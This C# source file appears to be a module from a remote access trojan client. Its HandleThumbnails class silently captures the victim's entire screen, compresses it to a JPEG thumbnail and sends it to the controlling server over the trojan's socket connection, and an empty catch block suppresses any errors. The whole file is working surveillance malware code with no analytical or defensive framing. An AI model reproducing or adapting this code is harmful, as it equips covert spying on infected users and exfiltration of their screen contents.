﻿using Client.MessagePack;
using Client.Sockets;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Client.Handle_Packet
{
   public class HandleThumbnails
    {
        public HandleThumbnails()
        {
            try
            {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using (Graphics g = Graphics.FromImage(bmp))
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                    Image thumb = bmp.GetThumbnailImage(256, 256, () => false, IntPtr.Zero);
                    thumb.Save(memoryStream, ImageFormat.Jpeg);
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "thumbnails";
                    msgpack.ForcePathObject("Image").SetAsBytes(memoryStream.ToArray());
                    ClientSocket.Send(msgpack.Encode2Bytes());
                }
                bmp.Dispose();
            }
            catch { }
        }
    }
}
